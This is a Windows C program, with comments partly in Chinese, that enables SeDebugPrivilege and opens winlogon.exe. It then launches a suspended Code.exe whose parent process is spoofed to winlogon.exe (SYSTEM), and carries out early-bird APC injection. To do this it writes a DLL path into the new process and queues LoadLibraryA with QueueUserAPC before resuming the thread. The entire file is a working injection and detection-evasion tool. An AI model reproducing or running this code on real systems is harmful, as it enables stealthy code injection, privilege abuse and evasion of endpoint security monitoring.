#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// enable debug privilege for open high privileged process handle
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return GetLastError() != ERROR_NOT_ALL_ASSIGNED;
}

// get pid by process name
DWORD GetParentPidByName(const wchar_t* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W entry = { sizeof(PROCESSENTRY32W) };
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return 0;
}

int main() {
    const char* targetPath = "C:\\Users\\admin\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe";
    const wchar_t* parentName = L"winlogon.exe";
    const char* dllPath = "C:\\Users\\admin\\Desktop\\TestDll.dll";
    HANDLE hParent = NULL, hProcess = NULL, hThread = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
    LPVOID remoteBuf = NULL;
    BOOL bSuccess = FALSE;

    // Privilege Escalation
    if (!EnableDebugPrivilege()) {
        printf("[-] Escalation failed, please run with admin privilege!\n");
        return 1;
    }
    else {
        printf("[+] Escalation successfully.\n");
    }

    do {
        // get parent process pid
        DWORD parentPid = GetParentPidByName(parentName);
        if (parentPid == 0) {
            printf("[-] Can't found the pid of parent process: %s\n", parentName);
            break;
        }

        // need PROCESS_CREATE_PROCESS privilege for spoof
        hParent = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION, FALSE, parentPid);
        if (!hParent) {
            printf("[-] Open winlogin.exe failed, error code: %d\n", GetLastError());
            break;
        }

        // initialize attribute list
        SIZE_T attributeSize = 0;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
        InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attributeSize);
        UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

        // create process
        STARTUPINFOEXA siex = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
        siex.lpAttributeList = lpAttributeList;
        if (!CreateProcessA(NULL,
            (LPSTR)targetPath,
            NULL,
            NULL,
            FALSE,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
            NULL,
            NULL,
            &siex.StartupInfo,
            &pi)) {
            printf("[-] 进程创建失败: %d\n", GetLastError());
            break;
        }

        hProcess = pi.hProcess;
        hThread = pi.hThread;
        printf("[+] 目标进程已创建 (PID: %d)，其父进程已伪造为 %s (SYSTEM)\n", pi.dwProcessId, parentName);

        // 4. 注入 DLL 路径
        SIZE_T pathLen = strlen(dllPath) + 1;
        remoteBuf = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteBuf) break;
        WriteProcessMemory(hProcess, remoteBuf, dllPath, pathLen, NULL);

        // 5. 早鸟注入：QueueUserAPC
        FARPROC pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        if (!QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)remoteBuf)) break;

        // 6. 恢复线程执行
        ResumeThread(hThread);
        bSuccess = TRUE;
        printf("[+] 注入指令成功提交！\n");

    } while (0);

    // 清理资源
    if (lpAttributeList) {
        DeleteProcThreadAttributeList(lpAttributeList);
        HeapFree(GetProcessHeap(), 0, lpAttributeList);
    }
    if (hParent) CloseHandle(hParent);
    if (hProcess) CloseHandle(hProcess);
    if (hThread) CloseHandle(hThread);

    system("pause");

    return bSuccess ? 0 : 1;
}